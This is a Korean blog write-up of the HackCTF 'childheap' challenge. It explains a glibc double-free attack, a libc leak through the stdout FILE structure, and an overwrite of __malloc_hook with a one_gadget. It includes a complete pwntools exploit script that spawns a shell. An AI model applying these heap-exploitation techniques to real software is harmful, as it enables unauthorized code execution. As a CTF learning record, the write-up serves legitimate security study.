---
layout: post
title:  "HacCTF childheap write-up"
date:   2020-03-25 19:45:55
image:  hackctf_childheap.PNG
tags:   [Hackctf]
categories: [Write-up]
---

# [HackCTF] childheap

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled.png)

카나리, NX 가 걸려있다. PIE는 안걸려있다.



**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%201.png)

1번을 선택하여 원하는 인덱스에 malloc으로 content를 삽입 가능하다. 또한 2번으로 원하는 인덱스를 free한다



**3) 코드흐름 파악**

- **Malloc()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%202.png)

    1. main()은 별게 없고 Malloc함수와 Free함수만 집중적으로 보면 된다. 우선 어떤 인덱스에 넣을건지 선택하게 되는데 인덱스는 0 ~ 4 까지만 선택 가능하다. 또한 content의 size도 128byte까지만 입력 가능하다. 
    2. 두개의 조건을 통과하면 bss 영역에 있는 ptr 배열에 입력한 사이즈만큼 malloc한 주소를 저장한다.
    3. read 함수로 해당 영역에 content를 입력한다



- **Free()**

    !![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%203.png)

    1. 여기도 선택하는 인덱스의 제한이 동일하게 존재한다.
    2. 0 ~ 4 사이의 인덱스를 선택했다면 해당 인덱스에 들어있는 청크를 free시킨다





### 2. 접근방법

---

- 우선 free시 해당 ptr 배열을 초기화 하지 않기 떄문에 uaf가 가능할 것이고 이를 통해 DFB가 가능하다.

- 그다음 libc 주소를 leak해야 한다. 입력한 데이터를 출력해주는 함수가 없는데 어떻게 해야 할까처음 알게된 방법이라 롸업을 보면서 문제를 풀었다. 일단 우리는 `_IO_stdout_`을 이용해서 leak을 할 것이다.  leak 방법은 아래에서 확인 가능하다

    ---

    [stdout의 file structure flag를 이용한 libc leak](https://www.notion.so/stdout-file-structure-flag-libc-leak-b84cf7a1787440d597df374546e70236)

    ---

- 처음에 문제를 풀때 128바이트보다 큰 값은 입력할 수 없기 때문에 128도 안됀다고 착각해버렸다. 따라서 fastbin 사이즈 청크만 할당 가능하다고 생각하여 unsorted bin에 청크를 넣는 것 부터 시작하였다.



- 시나리오
    1. DFB를 이용하여 사이즈가 조작된 fastbin size 보다 큰 fake 청크를 fastbin에서 할당받게 만듬
    2. fake 청크를 할당받았다면, 해당 청크가 free될 시 `unsorted bin`으로 들어감
        - 따라서 fake 청크의 fd와 bk에 bin 주소가 들어가게 됨`(main_arena+88)`
        - bin은 `main_arena` 구조체에 들어있는 값임. `main_arena`는 libc의 data segment에 존재하기 때문에 결국 fd,bk에 들어가는 값은 libc 주소들과 가까움
        - stdout주소와 `main_arena+88` 주소는 하위 2바이트만 다르고 나머지는 동일함.
        - 또한 오프셋을 동일하므로 가령 stdout의 오프셋이 0x620이면 0x?620 이렇게 2바이트 중 ?부분만 램덤으로 때려맞추면 됨.

    3. 그럼 이제 DFB를 다시 이용하여 `main_arena+88` 값을 조작한 뒤, 해당 청크를 할당받게 함
        - 단. 그대로 stdout 주소로 박으면 안됨. 청크 구조 형태를 맞춰줘야하기 때문에

             `stdout-0x43` 정도의 메모리를 보면 청크 구조처럼 되어있눈 부분이 있음. 이 주소를 `main_arena+88` 를 이용하여 조작해야함

    4. 이를 이용하여 libc leak을 진행
    5. leak된 주소를 이용하여 malloc_hook을 one_gadget으로 덮음
        - DFB를 이용해서 똑같이 이용하면 됨.
    6. malloc_hook 역시 청크 구조에 맞는 위치를 할당해줘야함. 
    7. malloc_hook이 덮혔다면 마지막으로 malloc 호출하면 쉘이 떨어짐 

이제 위 시나리오대로 차근차근 확인해보자





### 3. 풀이

---

**(중간중간에 디버깅을 종료하고 다시 시작해서 메모리 주소가 다름. 오프셋 위주로 확인하시길 ...)**

1. **DFB를 이용하여 사이즈가 조작된 fastbin size 보다 큰 fake 청크를 fastbin에서 할당받게 만듬**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%204.png)

    - 우선 3개의 malloc을 진행하고 인덱스 0, 1, 0 순으로 free시켜 DFB를 일으킨다.
    - 첫번째 malloc 시에 마지막에 0x71이 들어가게 해준다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%205.png)

    - 현재 fastbin 상태이다. 위에서 malloc한 동일 사이즈로 다시 malloc을 하게 되면 fastbin[5]에 들어있는 청크들이 재할당 된다.
    - DFB를 이용했기 때문에 처음 할당받은 0x2325000 청크를 처음에 할당받으면서 데이터를 쓰면, 삽입한 데이터가 3번째 malloc 시 청크 주소로 되면서 재할당 된다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%206.png)

    - 다시 동일 사이즈로 4번의 malloc 중 첫번째 malloc이 호출된 상태이다. mem 영역에 한바이트는 0x60으로 넣었기 때문에 fastbin[5]의 마지막 리스트에는 0x176d060의 주소를 가리키게 된다.
    - 따라서 2,3번이 진행되고 4번의 malloc이 진행된다면 0x176d060의 주소를 청크로하여 할당받을 것이다.
    - 그렇게 된다면 해당 fake 청크의 mem 영역은 0x176d070부터 시작할 것이고, 0x176d078에 들어있는 0x71 값을 변경 가능하다. unsorted bin에 들어가게 하기 위해 0x91로 변경할 것이다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%207.png)

    - 4번까지 진행이 완료된 상황이다. ptr[1]을 보면 실사이즈는 0x71이지만 아까 0x91를 조작하여 넣었기 때문에 chunk size의 위치에 0x91이 들어가 있다. 따라서 해당 ptr[1]을 free시키면 0x91사이즈 청크로 착각하여 fastbin이 아닌, unsorted bin에 들어 갈 것이다.



2. **fake 청크를 할당받았다면, 해당 청크가 free될 시 `unsorted bin`으로 들어감**
    - 따라서 fake 청크의 fd와 bk에 bin 주소가 들어가게 됨`(main_arena+88)`
    - bin은 `main_arena` 구조체에 들어있는 값임. `main_arena`는 libc의 data segment에 존재하기 때문에 결국 fd,bk에 들어가는 값은 libc 주소들과 가까움
    - stdout주소와 `main_arena+88` 주소는 하위 2바이트만 다르고 나머지는 동일함.
    - 또한 오프셋을 동일하므로 가령 stdout의 오프셋이 0x620이면 0x?620 이렇게 2바이트 중 ?부분만 램덤으로 때려맞추면 됨.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%208.png)

    - 헌데 free(1)이 진행되면 에러가남. 그이유는 다음과 같음

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%209.png)

    - ptr[1]의 청크 사이즈는 현재 0x91로 파악하여 free가 된다면 top 청크가 바로나와야 하는데 현재 fake 청크이므로 top 청크 사이에 공백이 존재하게 된다
    - 따라서 free(1) 시 에러가 발생하는 것임. 그렇기 때문에 에러를 피하기 위해 빨간색 영역을 청크의 영역으로 채워야함. 사이즈는 0x50임

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2010.png)

    - 맨~~~ 처음 malloc 4번을 진행할때 3번 을 이렇게 변경해서 malloc하면 됨

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2011.png)

    - 0x50이 추가되었고, 에러가 안나고 free(1)가 호출됨.
    - 최종적으로 0x76f070 청크가 unsorted bin에 들어갔고 fd, bk에 main_arena+88의 주소가 들어감

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2012.png)

    - fk 값의 하위 2바이트를 위 빨간줄친 주소로 변경할꺼임. 0x?5dd 여기서 ? 부분이 랜덤이므로 16분의 1의 확률로 때려맞추면 됨. 나는 행운의 숫자 7로 했음. 0x7f730376c7dd가 위 메모리 상황처럼 되기를 기도하면 됨

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2013.png)

    - 아까 0x91크기의 unsorted bin 청크에서 0x70만큼만 쓰므로 0x20으로 쪼개지는 것을 볼수 있음.
    - 그리고 입력한 0x75dd 값이 들어감.
    - 이제 다시 DFB를 이용해서 0x76f080에 들어있는 주소를 청크로 하여 재할당되게 할 꺼임



3. **그럼 이제 DFB를 다시 이용하여 `main_arena+88` 값을 조작한 뒤, 해당 청크를 할당받게 함**
    - 단. 그대로 stdout 주소로 박으면 안됨. 청크 구조 형태를 맞춰줘야하기 때문에 stdout-0x43 정도의 메모리를 보면 청크 구조처럼 되어있눈 부분이 있음. 이 주소를 `main_arena+88` 를 이용하여 조작해야함

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2014.png)

    - DFB를 일으키기 좋은 청크를 하나더 malloc으로 생성해주고 4,0,4 순으로 해당 인덱스를 free 시킨다.
    - 우리가 원하는 건 0xb4080에 들어있는 값을 주소로하여 청크 재할당을 받는 것이다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/20childheap/Untitled%2015.png](HackCTF%20childheap/Untitled%2015.png)

    - 1번이 진행되면 0xb41160에 0xb41070이 들어간다.
    - 이제 2,3,4,가 진행되면 DFB로 0xb41070에 있는 값을 재할당 할수 있을것이다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2016.png)

    - 현재 반복문으로 랜덤값을 돌리는 중인데 아까는 0x...75dd로 했는데 이번에는 0x..c5dd로 해봤다.
    - 하지만 두 노란색 박스의 값이 아직도 일치하지 않는다.
    - 반복문으로 에러나면 다시 실행시키는 식으로 돌리다 보면 운좋게 일치하는 경우가 생길 것이다.
    - 그렇게 된다면 Malloc() 함수가 끝나고 main에서 menu 함수 안의 puts가 실행될때 stdout 을 이용하여 leak이 일어날 것이다.



4. **이를 이용하여 libc leak을 진행**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2017.png)

    - 저렇게 leak이 된다. 저기 빨간줄친 부분에서 -131을 하면 stdout의 주소가 나온다 따라서 이를 이용해서 libc_base를 알 수 있다. 아니면 0x88위치에 0x7f732f07b8e0 주소가 있는데, 이는 stdin 주소로써 이를 이용해도 된다.



5. **leak된 주소를 이용하여 malloc_hook을 one_gadget으로 덮음**
    - DFB를 이용해서 똑같이 이용하면 됨.

    !![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20childheap/Untitled%2018.png)

    - DFB를 이용해서 __malloc_hook을 one_gadget으로 덮었음



최종 익스코드는 다음과 같다

    from pwn import *
    
    def malloc(index,size,content):
    	p.sendlineafter("> ","1")
    	p.sendlineafter("index: ",str(index))
    	p.sendlineafter("size: ",str(size))
    	p.sendafter("content: ",str(content))
    
    def free(index):
            p.sendlineafter("> ","2")
            p.sendlineafter("index: ",str(index))
    
    
    while(1):
    	context(arch="amd64",os="linux",log_level="DEBUG")
    	#p=remote("ctf.j0n9hyun.xyz",3033)
    	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
    	p=process("./childheap",aslr="False")
            #gdb.attach(p,'code\nb *0x968+$code\n')
    	e=ELF("./childheap")
    	libc=ELF("./libc.so.6")
    
    	malloc(0,100,p64(0)*11+p64(0x71))
    	malloc(1,100,"A"*8)
    	#malloc(2,100,"B"*8+p64(0)*2+p64(0))
    	malloc(2,100,"B"*8+p64(0)*2+p64(0x51))
    	#malloc(4,100,"C"*8)
    	free(0)
    	free(1)
    	free(0)
    	#pause()
    	
    	malloc(0,100,p8(0x60))
    	malloc(1,100,"A"*8)
    	malloc(2,100,"B"*8)
    	malloc(3,100,p64(0)+p64(0x91))
    
    
    	free(1)
    	malloc(1,100,p16(0xc5dd))
            malloc(4,100,"C"*8)
    
    	free(4)
    	free(0)
    	free(4)
    
    	malloc(4,100,p8(0x70))
    	malloc(0,100,"A"*8)
    	malloc(4,100,"A"*8)
    	malloc(0,100,"A"*8)
    
    	try:
    		malloc(4,100,"A"*3+p64(0)*6+p64(0xfbad3887)+"\x00"*25)
    		gdb.attach(p,'code\nb *0xa09+$code\n')
    		pause()
    	except:
    		p.close()
    		continue
    
    
    	#log.info(tmp)
    	#p.recv(0x48)
    	#log.info(u64(p.recv(8))-0x73250)
    	p.recv(0x88)
    	pause()
    	libc_base=u64(p.recv(6)+"\x00\x00")-libc.symbols['_IO_2_1_stdin_']
    	log.info("libc base::"+hex(libc_base))
    	#pause()
    
    	malloc_hook=libc_base+libc.symbols['__malloc_hook']	
    	one_gadet=libc_base+0xf1147
    	malloc(0,100,"A"*8)
    	malloc(1,100,"B"*8)
    
    	free(0)
    	free(1)
    	free(0)
    
    	malloc(0,100,p64(malloc_hook-35))
    	malloc(1,100,"A"*8)
    	malloc(0,100,"B"*8)
      malloc(1,100,"E"*19+p64(one_gadet))
    
      p.sendlineafter("> ","1")
      p.sendlineafter("index: ",str(2))
      p.sendlineafter("size: ",str(30))
    
    	p.interactive()





### 4. 몰랐던 개념

---

- libc leak using stdout _IO_FILE structure

    해당 개념은 따로 정리를 했다.

- 파일 디스크립터 관련하여 해결해야할 문제들이 몇개 있다
- house of orange도 fopen 관련 문제이기 때문에 확실하게 공부하는것이 도움이 될 것같다